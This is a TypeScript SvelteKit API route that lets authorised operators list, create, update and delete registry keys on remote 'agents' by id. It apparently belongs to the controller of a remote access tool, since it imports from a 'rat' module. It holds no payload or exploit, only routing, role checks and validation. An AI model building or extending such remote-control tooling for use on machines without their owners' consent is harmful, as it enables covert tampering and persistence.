import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import {
  registryListRequestSchema,
  registryCommandRequestSchema,
} from '$lib/types/registry';
import { dispatchRegistryCommand, RegistryAgentError } from '$lib/server/rat/registry';

function assertAgentId(id: string | undefined): asserts id is string {
  if (!id) {
    throw error(400, 'Missing agent identifier');
  }
}

function handleRegistryAgentError(err: unknown): never {
  if (err instanceof RegistryAgentError) {
    throw error(err.status, err.message);
  }
  throw err;
}

export const GET: RequestHandler = async ({ params, url, locals }) => {
  const id = params.id;
  assertAgentId(id);

  requireViewer(locals.user);

  const candidate: Record<string, unknown> = { operation: 'list' };
  const hiveParam = url.searchParams.get('hive');
  const pathParam = url.searchParams.get('path');
  const depthParam = url.searchParams.get('depth');

  if (hiveParam) {
    candidate.hive = hiveParam;
  }
  if (pathParam) {
    candidate.path = pathParam;
  }
  if (depthParam !== null) {
    const depth = Number(depthParam);
    if (!Number.isFinite(depth)) {
      throw error(400, 'Depth must be a number');
    }
    candidate.depth = depth;
  }

  const parsed = registryListRequestSchema.safeParse(candidate);
  if (!parsed.success) {
    throw error(400, 'Invalid registry list parameters');
  }

  try {
    const result = await dispatchRegistryCommand(id, parsed.data);
    return json(result);
  } catch (err) {
    handleRegistryAgentError(err);
  }
};

async function parseCommandRequest(request: Request) {
  let payload: unknown;
  try {
    payload = await request.json();
  } catch {
    throw error(400, 'Invalid registry payload');
  }
  const parsed = registryCommandRequestSchema.safeParse(payload);
  if (!parsed.success) {
    throw error(400, 'Invalid registry payload');
  }
  return parsed.data;
}

export const POST: RequestHandler = async ({ params, request, locals }) => {
  const id = params.id;
  assertAgentId(id);

  const user = requireOperator(locals.user);
  const parsed = await parseCommandRequest(request);
  if (parsed.operation !== 'create') {
    throw error(400, 'Registry create payload required');
  }

  try {
    const result = await dispatchRegistryCommand(id, parsed, { operatorId: user.id });
    return json(result, { status: 201 });
  } catch (err) {
    handleRegistryAgentError(err);
  }
};

export const PATCH: RequestHandler = async ({ params, request, locals }) => {
  const id = params.id;
  assertAgentId(id);

  const user = requireOperator(locals.user);
  const parsed = await parseCommandRequest(request);
  if (parsed.operation !== 'update') {
    throw error(400, 'Registry update payload required');
  }

  try {
    const result = await dispatchRegistryCommand(id, parsed, { operatorId: user.id });
    return json(result);
  } catch (err) {
    handleRegistryAgentError(err);
  }
};

export const DELETE: RequestHandler = async ({ params, request, locals }) => {
  const id = params.id;
  assertAgentId(id);

  const user = requireOperator(locals.user);
  const parsed = await parseCommandRequest(request);
  if (parsed.operation !== 'delete') {
    throw error(400, 'Registry delete payload required');
  }

  try {
    const result = await dispatchRegistryCommand(id, parsed, { operatorId: user.id });
    return json(result);
  } catch (err) {
    handleRegistryAgentError(err);
  }
};
